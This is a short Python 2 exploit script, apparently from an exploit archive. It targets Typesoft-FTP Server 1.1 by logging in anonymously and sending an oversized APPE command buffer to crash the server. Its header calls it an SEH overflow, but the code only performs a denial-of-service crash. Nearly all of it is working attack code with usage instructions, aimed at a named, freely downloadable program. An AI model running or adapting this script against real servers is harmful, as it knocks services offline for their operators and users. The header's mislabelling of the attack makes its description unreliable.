###############################################################################
# SEH overflow exploiting a vulnerability in Typesoft-FTP APPE command.
# Date of Discovery: 3/16/2012 (0 Day)
# Author: Brock Haun
# Vulnerable Software Download: http://sourceforge.net/projects/ftpserv/
# Software Version: 1.1
# Target OS: Windows 7
# REQUIRES VALID CREDENTIALS. Luckily, anonymous logins are enabled by default.
###############################################################################
import socket, sys
if len(sys.argv)!= 2:
     print &#039;\n\t[*] Usage: ./&#039; + sys.argv[0] + &#039; <target host>&#039;
     sys.exit(1)
print &#039;\n\t[*] TypesoftFTP Server 1.1 Remote DoS (APPE) by Brock Haun&#039;
host = sys.argv[1]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = &#039;A../&#039; + &#039;\x41&#039; *100
print &#039;\n\t[*] Sending crash buffer ("A../ + \x41 * 100").&#039;
s.connect((host,21))
data = s.recv(1024)
s.send(&#039;USER anonymous&#039; + &#039;\r\n&#039;)
data = s.recv(1024)
s.send(&#039;PASS anonymous&#039; + &#039;\r\n&#039;)
data = s.recv(1024)
s.send(&#039;APPE &#039; + buffer + &#039;\r\n&#039;)
print &#039;\n\t[*] Done! Target should be unresponsive!&#039;
s.close()



